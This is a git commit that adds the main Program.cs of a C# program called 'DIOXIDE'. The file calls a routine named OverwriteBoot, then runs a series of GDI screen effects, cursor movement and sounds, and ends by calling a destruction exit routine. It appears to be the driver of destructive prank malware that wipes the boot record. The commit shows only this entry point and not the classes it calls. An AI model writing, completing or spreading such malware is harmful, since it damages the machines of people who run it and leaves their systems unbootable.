ae136a61f242b9c62b06a75be509ae54444d90a6
Mist <59188378+Mist0090@users.noreply.github.com>
2021-12-16 22:51:50 +0900

    Add files via upload

---
+++ main-Dioxide/Program.cs
@@ -0,0 +1,66 @@
+﻿using System.Threading;
+using System.Threading.Tasks;
+using System;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace DIOXIDE
+{
+    class Program
+    {
+        public static void Main()
+        {
+            execute();
+        }
+        public static void execute()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            payloads.CreateWaveFile();
+            destruction.OverwriteBoot();
+
+            Thread.Sleep(5000);
+
+            run_payloads();
+
+            destruction.Exit();
+        }
+        private static void run_payloads()
+        {
+            int True = 1;
+
+            payloads payloads = new payloads();
+
+            Task.Run(payloads.cursor_movement);
+
+            Task.Run(payloads.gdi1);
+            payloads.Sound1();
+            payloads.gdi1_cancel = True;
+
+            Task.Run(payloads.gdi2);
+            payloads.Sound2();
+            payloads.gdi2_cancel = True;
+
+            Task.Run(payloads.gdi3);
+            payloads.Sound3();
+            payloads.gdi3_cancel = True;
+
+            Task.Run(payloads.gdi2);
+            Task.Run(payloads.gdi3);
+            payloads.Sound4();
+            payloads.gdi2_cancel = True;
+            payloads.gdi3_cancel = True;
+
+            Task.Run(payloads.gdi4);
+            payloads.Sound5();
+            payloads.gdi4_cancel = True;
+
+            Task.Run(payloads.gdi5);
+            payloads.Sound6();
+            payloads.gdi5_cancel = True;
+
+            return;
+        }
+    }
+}
